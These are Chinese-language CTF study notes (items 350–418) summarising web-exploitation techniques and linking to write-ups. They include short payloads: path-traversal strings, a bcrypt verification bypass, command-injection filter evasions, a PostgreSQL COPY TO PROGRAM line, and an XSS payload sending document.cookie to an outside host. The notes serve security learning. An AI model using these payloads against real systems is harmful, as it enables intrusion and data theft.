- 尝试用latex读取文件，但是需要绕过黑名单。wp的做法利用`\catcode`改变字符的category code。比如\catcode`\@=0,将@字符的作用改成了\，以后需要用\的地方都可以用@代替。额外地，还可以利用这个方法将_改成13。因为flag里通常包含下划线，改成13后不会让latex报错
- 其他做法: https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#latex
350. [love card](https://github.com/4n86rakam1/writeup/blob/main/TCP1PCTF_2023/Web/love_card/index.md)
- php利用[log_errors](https://www.php.net/manual/en/errorfunc.configuration.php#ini.log-errors)和[error_log](https://www.php.net/manual/en/errorfunc.configuration.php#ini.error-log)写内容至任意文件。log_errors为标记是否log error的bool值，error_log为error输出的文件名。可以用ini_set控制这两个值，如：
```php
foreach ($_GET as $key => $value) {
  ini_set($key, $value);
}
```
351. [PDFIFY](https://nightfury99.github.io/TCP1PCTF2023/PDFIFY)
- php [knplabs/knp-snappy phar deserialization vulnerability](https://github.com/KnpLabs/snappy/security/advisories/GHSA-gq6w-q6wh-jggc)。当攻击者可控制Pdf对象的generateFromHtml函数的第二个参数“输出文件”时，可实现rce。首先往服务器上传一个a.phar，然后generateFromHtml("some content",'phar://a.phar')。a.phar反序列化时即可执行内部的代码。因为本质上是反序列化漏洞，内部代码的构造需要在项目里寻找反序列化的gadget。一个便捷的生成工具：[phpggc](https://github.com/ambionics/phpggc)。对于CodeIgniter4，也可以直接去 https://github.com/ambionics/phpggc/blob/master/gadgetchains/CodeIgniter4/RCE/2/gadgets.php 拿gadgets，然后[手动构造phar](https://nightfury99.github.io/notes/Php-Internal/phar-deser#how-to-use-phar-archive-)
- php codeigniter4框架 sql注入。参考 https://www.youtube.com/watch?v=2vAr9K5chII&t=558s ，本质是因为直接将用户的data传进了where/getWhere函数：
```php
$data = $this->request->getPost();
$user = $this->model->where($data)->first();
```
假设data为`param1=a&param2=b`，value处的a和b无法注入，但是参数处的param1和param2可以
- php [Variables From External Sources](https://www.php.net/manual/en/language.variables.external.php)。例如`<input type="text" name="my.name"/>`，值需要通过`$_REQUEST["my_name"]`得到。除了`.`会被改成`_`，还有空格` `和方括号`[`
- php绕过password_verify(bcrypt)。参考 https://bugs.php.net/bug.php?id=81744 和 https://github.com/php/php-src/security/advisories/GHSA-7fj2-8x79-rjf4 ，任何密码都可以用`$2x$08$00000$`或`$2y$10$am$2y$10$am`通过验证
- [wkhtmltopdf SSRF漏洞](https://github.com/wkhtmltopdf/wkhtmltopdf/issues/4875)。任何可以用来加载外部资源的html标签都可以用来触发该漏洞
- curl [URL globbing](https://everything.curl.dev/cmdline/globbing)。可用于绕过过滤，比如请求gopher：`curl {g}opher://localhost:80/_payload`
- 小型python ftp server代码： https://gist.github.com/dkw72n/193cfec6572fb392b671 。允许匿名连接该服务器，无需密码
- 其他做法： https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#pdfify
352. [Un Secure](https://github.com/RuiZha0/TCP1PCTF_2023)
- php反序列化时不会记录字段的可访问性。需要手动添加（比如需要添加`%00类名%00`来表示当前字段是标有private的私有属性。参考 https://wiki.wgpsec.org/knowledge/ctf/php-serialize.html ），或者使用php的反射API
- 和347条重复了……
353. [Calculator](https://github.com/RuiZha0/TCP1PCTF_2023)
- js只使用Math相关函数的构造技巧：
    - 构造数字：`Math.sin.name.length.valueOf()`，利用Math内置函数的名字的长度获取数字
    - 构造字母：`Math.sin.name.length.toString()`。或者直接用构造器：`Math.sin.name.constructor(110)`。这些字符都是数字，字母的字符可以用`Math.sin.name.constructor.fromCharCode(35)`或`Math.sin.name.constructor.fromCharPoint(35)`。这里参数的数字可以参考wp的做法用`Math.floor(Math.log2(Math.exp(num)))`套娃构造
    - js里给没有参数函数传参不会报错，无论怎么传也不会影响函数的结果
    - js里重写的函数name属性是空。具体如下：
    ```js
    Math.random.name.toLowerCase()
    'random'
    Math.random=function(){}
    Math.random.name.toLowerCase()
    ''
    ```
    - deno环境读取文件的捷径：`return Deno.readTextFileSync('flag.txt')`，稍微复杂一点是`return (new TextDecoder("utf-8")).decode(Deno.readFileSync("flag.txt"))`
- 其他做法： https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#calculator
- 类似题目：
    - https://sekai.team/blog/intigriti-0823/writeup/
    - https://blog.huli.tw/2023/08/29/intigriti-0823-author-writeup/
    - https://gist.github.com/egonny/4dbf5151f99059ae58cf9390c7cc3830
354. [fetcher](https://github.com/TCP1P/TCP1P-CTF-2023-Challenges/tree/main/Web/fetcher)
- vm2沙盒逃逸。参考 https://github.com/snowflakedb/snowflake-connector-nodejs/issues/571 ， poc： https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9
- 注意proxy-agent内部使用了vm2。如果可以控制proxyUrl参数，就能用`pac+data`协议注入payload并实现vm2沙盒逃逸，执行任意代码
355. [GetHub](https://gist.github.com/mlashley/3f2fbadd307a43a40a8e69e0e83052e7#gethub---web-easy)
- [gitPython RCE](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858)
- 其他解法： https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#gethub
356. [Nine-One-Sixteen](https://gist.github.com/mlashley/3f2fbadd307a43a40a8e69e0e83052e7#nine-one-sixteen-warmup)
- RFC9116中指定了security.txt，里面可能藏有flag
357. [Protecting Camp](https://gist.github.com/mlashley/3f2fbadd307a43a40a8e69e0e83052e7#protecting-camp)
- [nodejs parse-url SSRF](https://security.snyk.io/vuln/SNYK-JS-PARSEURL-2936249)
358. [Sparky](https://gist.github.com/mlashley/3f2fbadd307a43a40a8e69e0e83052e7#sparky---web-easy)
- apache spark command injection: https://github.com/HuskyHacks/cve-2022-33891
359. [YSON](https://gist.github.com/mlashley/3f2fbadd307a43a40a8e69e0e83052e7#yson)
- PyYamal反序列化RCE。可供使用的payload： https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#yson
360. [Zdir](https://github.com/opabravo/security-writeups/blob/main/ctf/2023-10-27%20Fetch%20The%20Flag%202023.md#zdir)
- [zdir 3.2.0 file upload to RCE](https://github.com/helloxz/zdir/issues/90)
361. [Ominous](https://github.com/opabravo/security-writeups/blob/main/ctf/2023-10-27%20Fetch%20The%20Flag%202023.md#ominous)
- [OMI RCE](https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-omi)
362. [Common Nginx misconfigurations](https://blog.detectify.com/industry-insights/common-nginx-misconfigurations-that-leave-your-web-server-ope-to-attack/)
363. [CRLF](https://i.geri.dev/6dce57c6d31ef535ae42da6b88c973.pdf)
- 可通过注入使dos2unix将某个文件从不可访问的地方拷贝至可访问的地方： https://gtfobins.github.io/gtfobins/dos2unix/
- 当flask的run里的debug选项为True时，若文件内引用的外部库或是文件本身发生变化，都会自动重启。利用这点可以对dependency进行投毒
- sudo下的dosbox利用： https://gtfobins.github.io/gtfobins/dosbox/
364. [Silent Cartographer](https://snyk.io/blog/snyk-fetch-the-flag-ctf-2023-writeup-silent-cartographer/)
- Covenant C2 framework 0.5以前的版本默认使用同样的JWT secret key，可以参考[exp](https://www.exploit-db.com/exploits/51141)实现RCE。注意这个exp随机选择8000以上的端口进行绑定，如果题目环境不允许也可以修改源码使其强制绑定到某个端口
365. [GeoGuessy](https://www.xanhacks.xyz/p/lakectf2023-geoguessy/)
- `<%=`和`<%-`的区别： https://stackoverflow.com/questions/11024840/ejs-versus 。前者转义html，后者不转
- domPurify不会过滤`<a>`标签
- js的geolocation api获取用户坐标时，会提示用户尝试获取权限。由`puppeteer`操控的机器人则需要看其Chrome profile设置的`geolocation`权限是什么
- 可以在iframe标签里`allow="geolocation *"`，即可在任意orgin获取定位
- 其他wp： https://siunam321.github.io/ctf/LakeCTF-Quals-23/web/GeoGuessy/
366. [OpenBio 2](https://zimzi.substack.com/p/cakectf-openbio-2)
- python bleach库也是净化html的一个库，过滤`<script>`和`<img>`不过类似`<strong>`之类无害的tag。里面有个linkify函数可以自动生成链接，`a.co&`可以使其生成十倍长的字符串
- 对已净化后的字符串截断并拼接上其他字符串是较为危险的做法
367. [AdBlog](https://www.youtube.com/watch?v=vXTltxDRNbM)
- DOM Clobbering。js可以根据某个标签的id来获取那个标签,[setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/setTimeout)可以根据标签来执行内部的代码。如：
```html
<a id=showOverlay href="cid:function a() {console.log(`a`)}a()"></a>
<script>
    setTimeout(showOverlay, 1000);
</script>
```
控制台会输出a。也可以参考官方wp的做法，用eval： https://github.com/theoremoon/cakectf2023-public/tree/master/web/adblog

368. [My Music](https://ctftime.org/writeup/38300)
- burpsuite设置可以勾选`only show in-scope items`以及`filter by MIME type`下的其他文件类型。前者帮助过滤非目标之外的请求，后者让bp拦截更多类型的请求
- [Server Side XSS (Dynamic PDF)](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf)：应用不过滤用户输入就将其制成pdf，则攻击者可以注入js代码实现文件读取
- 当可以控制page.pdf的[options](https://pptr.dev/api/puppeteer.pdfoptions)时，可以注入path选项将pdf输出到任意用户指定的路径
- express middleware。下面这段逻辑是有问题的：
```js
try {
    userData = JSON.parse(userData);
    if (userData.isAdmin !== true) {
        res.status(403);
        res.send("Only admins can view this page");
        return;
    }
} catch (e) {
    console.log(e);
}
next();
```
当JSON.parse报错时，会进入catch分支，然后直接next，从而绕过if的检查admin权限逻辑
- 视频wp： https://www.youtube.com/watch?v=JetPydd3ud4
369. `*`
370. `*`
371. `*`
372. [Glacier Exchange](https://github.com/4n86rakam1/writeup/tree/main/GlacierCTF_2023/web/Glacier_Exchange)
- python的浮点数有一些特殊值：inf，nan等，都大于任何实际上的数字。而且python里的浮点数也是有溢出的
373. [Peak](https://github.com/4n86rakam1/writeup/tree/main/GlacierCTF_2023/web/Peak)
- 将xss代码藏入jpg图片从而绕过CSP。工具： https://github.com/4n86rakam1/xss_injection_in_jpeg
- xxe读本地文件
374. https://www.youtube.com/watch?v=Marqe2SEYok
- 原型链污染+xss。主要使用的媒介是旧版本有漏洞的jQuery+google reCAPTCHA。相关payload：
    - https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/recaptcha.md
    - https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/jquery.md
- 在原型链污染时注意一点，如果网站本身已经设置了一个值，后续污染prototype就没用了。比如：
```js
window.recaptcha=true;
```
就算污染prototype为false，这个属性还是true。因为子物体设置的属性优先级要比prototype高。如果这个window.recaptcha是undefined就能污染了
- domain名严格来说应该以`.`结尾。在domain后自己加个`.`不会影响网站的访问。注意此时js访问document.domain时末尾也会有个点
- 可以污染chrome自带的Sanitizer()的config来允许某些标签（config内部记录了不会被过滤的标签）
375. [gatecrash](https://gist.github.com/JonasProgramz/2e92d2c7d95284cab066208128167017)
- nim Httpclient header CRLF注入： https://consensys.io/diligence/vulnerabilities/nim-httpclient-header-crlf-injection/ 。若攻击者可以控制newHttpClient的userAgent，即可注入CRLF，插入自己想要的攻击payload。注意`Content-Length`要匹配插入的payload的长度
- sql注入insert语句，往数据库里插入任意数据
376. [Phantomfeed](https://blog.bi0s.in/2023/12/16/Web/Phantomfeed-HTBUniversityCTF2023/)
- 当flask的`app.run`里选择了`threaded=True`，有可能可以利用条件竞争
- 当攻击者可以完全控制 `bot.get("http://127.0.0.1:5000" + link)` 中的link，即可将bot重定向至任意网站。比如link写`@example.com`，拼接后再访问，bot就会被导向至example.com。同是127.0.0.1但是不一样的端口也可以：如link写 `@127.0.0.1:3000/phantomfeed` bot就会访问`127.0.0.1:3000/phantomfeed`
- flask网站的response的默认Content-Type是`text/html`。如果能影响flask网站的response，将response换为html即可实现xss
- python reportlab模块RCE漏洞： https://github.com/c53elyas/CVE-2023-33733
- 其他wp：
    - https://jorianwoltjer.com/blog/p/ctf/htb-university-ctf-2023/phantom-feed ：使用[ffuf](https://github.com/ffuf/ffuf)实现条件竞争。另外注意python有GIL，在匹配正则时不会执行任何代码，于是不能利用正则延长竞争窗口。但是今天看[官方wp](https://github.com/hackthebox/uni-ctf-2023/tree/main/uni-ctf-2023/web/%5BHard%5D%20PhantomFeed)，又说可以用reDos……不太懂谁对。另外，官方wp里提到了nuxt的重定向漏洞： https://github.com/nuxt/nuxt/issues/9992 ，用三个斜线即可将用户重定向到任意网站
377. [Nexus Void](https://blog.bi0s.in/2023/12/15/Web/NexusVoid-HTBUniversityCTF20232023/)
- c# .NET反序列化RCE。只要`JsonConvert.DeserializeObject`的`JsonSerializerSettings`不是`TypeNameHandling.None`，都有漏洞的风险。利用方式和php的差不多，在源码内部找要序列化成的类/gadget即可
- c#里面`false.ToString()`是`False`，与false不同
- 拼接sql语句导致的sql注入
- 其他wp：
    - https://jorianwoltjer.com/blog/p/ctf/htb-university-ctf-2023/nexus-void ：`_configuration`可以在`appsettings.json`里找对应内容
378. 路径穿越相关payload
- `/robot/../flag/.`
- `..././flag`
- `././flag`
- `/robot/../flag/ss/..`
- `/flag/ss/..`
- `/robot/../flag/..`
- `/robot/..././flag/.../.`
- `flag/.`
379. [pocket-app](https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#pocket-app) 
- pocketbase js SDK使用
380. [Warmup](https://github.com/rixinsc/ctf-writeups/blob/master/wgmy2023.md#warmup---web)
- 利用chrome调试前端混淆js代码逻辑。可用api： https://developer.chrome.com/docs/devtools/console/utilities?hl=zh-cn#debug-function
- 文件包含漏洞：php filter的利用。如果黑名单禁掉了一些关键词，可以用某些较为冷门的filter，比如wp使用的zlib.deflate。完整filter目录： https://www.php.net/manual/en/filters.php 。另一篇[wp](https://d0ublew.github.io/posts/wgmy2023/web/warmup/)更清晰地展示了如何利用PHP PEARCMD从文件包含到getshell。参考 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/LFI-to-RCE.md#lfi-to-rce-via-php-pearcmd
381. [Pet Store Viewer](https://github.com/rixinsc/ctf-writeups/blob/master/wgmy2023.md#pet-store-viewer)
- python中的格式化字符串漏洞。若str.format执行之前str本身包含用户可控制的内容，则可以注入出全局变量等内容
- python格式化字符串漏洞参考链接：
    - https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
    - https://lucumr.pocoo.org/2016/12/29/careful-with-str-format/
    - https://security.stackexchange.com/questions/238338/are-there-any-security-concerns-to-using-python-f-strings-with-user-input/239661
    - https://podalirius.net/en/articles/python-format-string-vulnerabilities/
382. [My First AI Project](https://github.com/4n86rakam1/writeup/tree/main/Wargames.MY_2023_CTF/WEB/My_First_AI_Project)
- python pickle反序列化漏洞。不仅是最明显的pickle.load会触发这类漏洞，`numpy.load(file, allow_pickle=True)`也会。另一个[wp](https://github.com/rixinsc/ctf-writeups/blob/master/wgmy2023.md#my-first-ai-project)所使用的payload利用了shutil库复制文件
383. [Truco](https://github.com/4n86rakam1/writeup/tree/main/Wargames.MY_2023_CTF/WEB/Truco)
- 若php处于版本小于等于7.4.21的开发版本服务器（PHP Development Server <= 7.4.21），则可以通过向php文件发送特殊的GET请求来获取该文件的源码。参考 https://blog.projectdiscovery.io/php-http-server-source-disclosure/ 。若使用bp发送请求，需要关闭Update Content-Length
- php的extract函数可用于覆盖变量的值，如`_POST[func]`
384. [Status](https://github.com/4n86rakam1/writeup/tree/main/Wargames.MY_2023_CTF/WEB/Status)
- 利用文件包含漏洞进行Kubernetes信息收集
    - 从/etc/hosts中收集后端的机器名（pod running on a Kubernetes (k8s) cluster）
    - 获取Service Account Token（参考 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Kubernetes ）。获取token后，可以用nmap扫出Kubernetes的api端口（常用步骤见 https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/pentesting-kubernetes-services  ）
    - 参考 https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/kubernetes-enumeration ，利用api端口获取information about the Deployment named `<name>` and its related resources
    - kubectl本地使用参考 https://d0ublew.github.io/posts/wgmy2023/web/status/
- Nginx Alias Misconfiguration。下面的配置：
```
      location /static {
        alias       /usr/share/nginx/html/;
        add_header  Cache-Control "private, max-age=3600";
      }
```
可以用`/static../foo.txt`绕过，进而访问`/usr/share/nginx`下的文件。参考 https://labs.hakaioffsec.com/nginx-alias-traversal/

385. [Secret](https://d0ublew.github.io/posts/wgmy2023/web/secret/)
- kubernetes+[HashiCorp Vault](https://zhuanlan.zhihu.com/p/30983205)。可下载[工具](https://developer.hashicorp.com/vault/install#Linux)并设置环境变量VAULT_ADDR为vault的地址然后尝试登录
- 有些时候vault内保存的密码等敏感内容会被inject进kubernetes（参考 https://developer.hashicorp.com/vault/tutorials/kubernetes/kubernetes-sidecar ）。这时候文件可直接在`/vault/secrets`目录下读取
386. [Report Google?](https://blog.rockhouse.dev/2023/12/20/wargames-my-2023/)
- `https://www.google.com/amp/`后跟任意支持amp的网站即可实现重定向。另一种利用google重定向的方法参考 https://isc.sans.edu/diary/How+Malware+Campaigns+Employ+Google+Redirects+and+Analytics/19843 。后一种做法需要获取某个网站的usg内容，但是这个东西没法算，可以利用邮件让google生成后抄下来。其他参考链接： https://news.sophos.com/en-us/2020/05/15/how-scammers-abuse-google-searchs-open-redirect-feature/ ， https://github.com/aszx87410/blog/issues/87 ， https://vicevirus.github.io/posts/report-google-wgmy-2023/
- 无括号xss payload：`<svg/onload=location=/\test.com/+document.cookie>`
387. [tsh-go](https://github.com/CykuTW/tsh-go):go语言写的小型网站后门
388. [Armoured-notes](https://github.com/Pratham1812/ctf-writeups/tree/master/BackdoorCTF2023/armoured-notes)
- nodejs vite transformIndexHtml xss[漏洞](https://github.com/vitejs/vite/security/advisories/GHSA-92r3-m2mg-pj97?cve=title)。transformIndexHtml的使用方法为`transformIndexHtml(url,template)`，其中url为请求时的url。若该url未做过滤，攻击者可直接在该页面上获取xss（无关渲染的template）
389. `*`
390. [Rocket Explorer](https://ireland.re/posts/Backdoor_CTF_2023_Web/#webrocket-explorer)
- 若Spring Boot Actuator泄露(POST `/actuator/env`能得到内容，详细参考 https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database/ 和 https://0xn3va.gitbook.io/cheat-sheets/framework/spring/spring-boot-actuators#spring.datasource.hikari.connection-test-query )，攻击者可获取RCE。payload： https://github.com/spaceraccoon/spring-boot-actuator-h2-rce
391. [VulnChain](https://github.com/n0kto/ctf-writeups/tree/main/BackdoorCTF/VulnChain),[wp](https://oboembus.tech/blog/backdoor-ctf)
- 一个比较奇怪的题型，要求`ERC721InvalidSender`被调用。这个函数根据[源码](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol)，当`_mint` token时某个tokenId的previousOwner不为0时调用。即不能mint之前出现过的tokenId
- 使用Foundry获取被释放的合约地址
392. [ERaaS](https://lenoctambule.dev/post/nitectf-2023-eraas)/[CaaS](https://lenoctambule.dev/post/nitectf-2023-caas)/[caas_renewed](https://heckintosh.github.io/competitions/nitectf2023/)
- 命令注入技巧：可以用`$()`提前获取命令的输出
- 可以将\`\`或者`$()`放在两个字母之间，起到绕过某些多字母过滤词的作用，如en\`\`v。若`.`被过滤，可以用`${ls -a | sed '2q;d'}`获取`..`，配合cd就能去到任意的上级目录
- 可用`pwd|c'u't${IFS}-c1`获取字符`/`
- 其他做法：
    - https://github.com/satoki/ctf_writeups/tree/master/niteCTF_2023/caas_renewed ：利用base64绕过黑名单
    - https://github.com/daffainfo/ctf-writeup/tree/main/2023/niteCTF%202023/caas%20renewed :命令之间加`$@`不会影响命令执行
    - https://github.com/Cryptonite-MIT/niteCTF-2023/tree/main/web/caas_renewed ：`${PWD%%[a-z]*}`获取`/`，用`?`匹配可能命令
393. [LiteLibrary v2](https://github.com/Cryptonite-MIT/niteCTF-2023/tree/main/web/litelibrary_v2)
- openlibrary JSONP端口利用。若题目允许注入html但CSP限制了default-src为`openlibrary.org`，可以用iframe的srcdoc配合openlibrary的JSONP绕过
394. [Jay’s Bank](https://ireland.re/posts/UofTCTF_2024/#webjays-bank)
- `İ`本身在js里的长度为1，经过`toLowerCase()`函数后其长度会变为2。其他拥有类似特性的unicode字符： https://design215.com/toolbox/utf8-4byte-characters.php
- sql里定义table里的字段时也会定义最长长度，超过这个长度的内容会被截断，不会被录入数据库
395. [Advanced JSON Cutifier](https://seall.dev/posts/mapnactf2024#webadvanced-json-cutifier-74-solves)
- [go-jsonnet](https://github.com/google/go-jsonnet)库文件读取语法：
    - `(importstr "filepath") % { foo: "bar" }`
396. [Gimme-Content-Type](https://gist.github.com/parrot409/61822d4b55f335bae5aaeba6938ef52b)
- 利用pdf实现xss。chrome里的pdf由pdfium渲染，可在pdf里插入js代码，可绕过CSP。不过不能做类似fetch之类的东西，pdfium有自己的api。类似思路： https://portswigger.net/research/portable-data-exfiltration
- CSP `sec-fetch-mode=navigate`限制了无法使用script标签只能考虑frames和`window.open()`。Cookies若为None则表示iframe navigations contain cookies
397. [Fluxx](https://colleirose.github.io/influxdb-injection-nosql-injection-knightctf-2024)
- [InfluxDB NoSQL盲注](https://rafa.hashnode.dev/influxdb-nosql-injection)
398. [LordGPT](https://hackmd.io/@vow/HyNTcwSqp)
- 如果登录Microsoft账号时发现url包含`/oauth2/v2.0/`，且发现登录时报错`Selected user account does not exist in tenant ...`，可以将登录url中的tenant部分改为common，就可以用任意账号登录，而不仅仅局限于某个特定tenant的账号了
- [snowflake ID](https://abheist.com/blogs/twitter-snowflake-for-unique-ids)预测：获取多个seed后，可以得到Machine ID，再配合machine sequence ID就可以预测未来的id生成
- [nOAuth Microsoft Azure AD Vulnerability](https://www.descope.com/blog/post/noauth)：攻击者可自行注册一个Microsoft Azure账号，并修改账号的email为受害者的邮箱，这样登录时两者账号会被合并，即可登录上受害者的账号
399. [Hello from API GW](https://ctf.edwinczd.com/2024/tetctf-2024/hello-from-api-gw)
- js eval读文件payload。有些时候可以通过读环境变量来获取有关AWS的配置
- AWS相关渗透所需命令，及工具[enumerate-iam](https://github.com/andresriancho/enumerate-iam)（用于列举AWS IAM登录凭证对应的权限）的使用
400. [Microservices](https://ctf.edwinczd.com/2024/tetctf-2024/microservices)
- cloud AWS渗透（获取RCE及泄漏敏感信息）
401. [X Et Et](https://hackmd.io/@Solderet/HJ52F9496)
- js electron RCE。若electron内`new BrowserWindow`时设置了`sandbox: false`和`contextIsolation: false`，就能利用原型链污染获取RCE。类似技巧见 https://github.com/maple3142/My-CTF-Challenges/tree/master/HITCON%20CTF%202023/Harmony#rce-using-client-side-prototype-pollution
    - 读harmony的wp时发现里面还有更多没见过的技巧
        - Electron里`file://`属于same-origin，和Chromium不同
        - 如果可以上传文件的话，配合原型链污染有更简单的rce方式。除了设置sandbox为false，再把`Object.prototype.webview`设置为true。这样就能随意加载服务器上的js文件了
- 又一道相同考点的题，利用electron的这个特性从xss到RCE:[Elec](https://octo-kumo.github.io/c/ctf/2024-wanictf/web/elec)。完整脚本见 https://github.com/rerrorctf/writeups/tree/main/2024_06_21_WaniCTF24/web/elec
402. [Stress Release Service](https://medium.com/@s4r7h4k/7-characters-php-tetctf-2024-5f43ee0c7293)
- 利用7个非字母数字的字符在php内实现eval内代码执行。wp内列举了几个phpfuck相关的网站，不过这类网站给出的payload通常较长。php内可以将字符串看作函数执行：`'function_name'()`，所以可以利用这个特点加上异或获取字符执行任意代码
- 类似题及参考链接：
    - https://ctftime.org/writeup/36079
    - https://github.com/b-viguier/PhpFk
    - https://www.cnblogs.com/hetianlab/p/14143480.html 。利用里面提到的最后一种方法的wp：**stress release service**
403. Nepxion/Discovery[漏洞](https://securitylab.github.com/advisories/GHSL-2022-033_GHSL-2022-034_Discovery/)：SpEL注入以及SSRF
404. [ChatterBox](https://vozec.fr/writeups/chatterbox-realworld-ctf-2024/)
- PostgreSQL sql注入
    - PostgreSQL可以用`$`创建字符串，参考 https://www.postgresql.org/docs/8.1/sql-syntax.html 中的`4.1.2.2`，如`$tag$u$tag$`在查询语句里和`"u"`一致。利用这个符号可以创造出小写有效但大写无效的sql语句:`$u$foo$U$ a $U$bar$u$`，小写情况下`$u$`会被看作tag，得到字符串`"foo$U$ a username=$U$bar"`；大写情况下`$U$`会被看作tag，结果就不一样了
    - 可以在查询内容后添加`::json`，将内容强制转换为json。若报错即可爆出内容。超过7个字符的内容需要用substr
    - 利用query_to_xml和十六进制编码绕过过滤并实现任意文件读取；利用query_to_xml+lo_from_bytea+lo_export实现任意文件写入
    - pg_ls_dir可用于列举目录
- java thymeleaf模板注入获取RCE
- 其他wp/解法/sql注入或模板注入payload：
    - https://github.com/mmm-team/public-writeups/tree/main/rwctf2024/chatterbox ：
        - `COPY (SELECT '') TO PROGRAM '/readflag';--`可以执行`/readflag`，以及一些PostgreSQL sql语句构造技巧
        - 可以利用字符串拼接绕过[JSql](https://jsqlparser.sourceforge.net/)的AST过滤
        - 利用thymeleaf SSTI+postgres实现RCE，参考 https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#rce-to-program
    - https://samuzora.com/posts/rwctf-2024/
        - 这个解法利用了`FileSystemXmlApplicationContext`加载一个外部xml并在xml里执行命令。这样就不用担心thymeleaf内部的过滤了
    - https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#chatterbox
405. `*`
406. [minioday](https://github.com/mmm-team/public-writeups/tree/main/rwctf2024/minioday)
- minio CVE-2023-28434漏洞利用，可在minio服务器上执行任意代码
- 其他做法： https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#minioday
407. [another-csp](https://blog.huli.tw/2024/02/12/dicectf-2024-writeup/)
- 在iframe的sandbox全开（无法使用script标签），csp `default-src 'none'`（禁止引入任何外部资源），不能执行任何JavaScript，也无法透过meta重新导向的情况下leak同网页下的token。因css开了unsafe-inline，加上可以得知bot正在访问的网页是否关闭，故利用html+css使Chromium崩溃（相关[issue](https://issues.chromium.org/issues/41490764)）或使网页载入变慢，进而加快/拖慢bot的执行时间
- 利用dns-prefetch绕过CSP的详细介绍/相关链接： https://www.cse.chalmers.se/research/group/security/pdf/data-exfiltration-in-the-face-of-csp.pdf ， https://github.com/w3c/webappsec-csp/issues/542
- 其他做法：**another-csp**
408. [safestlist](https://blog.huli.tw/2024/02/12/dicectf-2024-writeup/#webx2fsafestlist-2-solves)
- 浏览器对网址长度有限制，可以利用一些特殊格式构造长的url：`http://${'a'.repeat(1000000)}}:pwd@localhost:3000`，其中那些a为用户名，pwd为密码，尝试对localhost:3000执行验证。过长的重定向后会触发错误，新打开的界面为`about:blank`
409. [burnbin](https://blog.huli.tw/2024/02/12/dicectf-2024-writeup/#webx2fburnbin-1-solve)
- 若上传的文件名为`.png`，在旧版的fastify static中就不会有mime type
- 利用dom clobbering修改document.defaultView使得react渲染攻击者指定的页面，从而在任意页面注入HTML跟CSS
- chrome connection pool利用
- 利用meta标签的connect-src CSP阻止请求
410. [Calculator](https://learn-cyber.net/writeup/Calculator)
- typescript中，假如某个函数只允许返回某个特定类型，可以将其他类型cast成any来绕过。例如只允许返回number类型，用`"a" as any`即可绕过类型检查，返回a
- typescript的ESLint可以用注释绕过：`/* eslint-disable-line */`。加了这句注释的ts代码不会被eslint检查
- 有助于理解typescript类型的文章： https://medium.com/free-code-camp/typescript-and-its-types-f509d799947d#14d9
- 其他解法（此题目标为让单句代码通过eval返回xss payload）：**Calculator**
411. [calculator-2](https://nanimokangaeteinai.hateblo.jp/entry/2024/02/06/051003#Web-135-calculator-2-33-solves)
- 类似Calculator，但是禁止加注释和使用as与any。解法是利用eval覆盖函数，使返回的数字类型实际上是字符串（更详细内容参考 https://one3147.tistory.com/77 ）
- 利用window.name缩短xss payload长度
- 其他解法：**calculator-2** ，Calculator的其他解法中也有部分可适用于这道题
412. `*`
413. [Simple WAF](https://github.com/abdoghazy2015/CTF-Write-Ups/tree/main/0xL4ughCTF2024/Web/Simple%20WAF)
- php preg_match在执行失败时会返回`PREG_BACKTRACK_LIMIT_ERROR`，在if语句里作为条件会被强制转换为false。可以用`phpinfo()`查看php pcre的匹配上限，超过上限后便会匹配失败
414. [DisLaugh](https://omakmoh.me/dislaugh/)
- 用ElectronJS搭建的程序源代码可在`resources/app.asar`拿到。可用工具[asar](https://github.com/electron/asar)从该后缀文件中提取源代码
- jquery的`jQuery.append()`不能用于未经过滤的用户输入，有xss的风险
- 极小xss payload： https://trustedsec.com/blog/cross-site-smallish-scripting-xsss
- 若js脚本内部nodeIntegration的值为true，意味着“Integrate Node.js features to be accessible directly from your page scripts”
415. [JWT Decoder](https://domdom.tistory.com/492)
- 小于3.1.7版本的ejs有RCE漏洞（需获取原型链污染）： https://security.snyk.io/vuln/SNYK-JS-EJS-2803307 ，但是根据这篇wp，似乎在调用ejs.render时直接传入object也可以触发
- [cookie-parser](https://www.npmjs.com/package/cookie-parser)特性:In addition, this module supports special "JSON cookies". These are cookie where the value is prefixed with `j:`. When these values are encountered, the value will be exposed as the result of JSON.parse. If parsing fails, the original value will remain. 以`j:`开头的cookie将会以parse后的json对象形式返回
416. [jason-web-token](https://hackmd.io/@vow/rJrgz1xn6)
- python的float计算缺陷（Floating point type confusion）。任何数与python里的float上限`1.8e+308`相加都会返回inf
- python里的int_parsing_size错误：当整数过大时，将其转为字符串会报错。这题的预期解正是利用这点尝试猜测出x+b中x的值（b可控），见 https://www.youtube.com/watch?v=DQ9yLCdmt-s 的介绍
417. [Filters](../../CTF/ShaktiCTF/ShaktiCTF.md)
- 绕过php对eval输入的过滤并执行系统命令/读文件
- 8进制编码不仅可以用在函数名，也可以用在参数。不过有时候会报错，尝试手动关闭php tag:`?>`。参考 https://thef0rceawak5ns.github.io/shaktictf
418. [Flaglang](https://github.com/uclaacm/lactf-archive/tree/main/2024/web/flaglang)
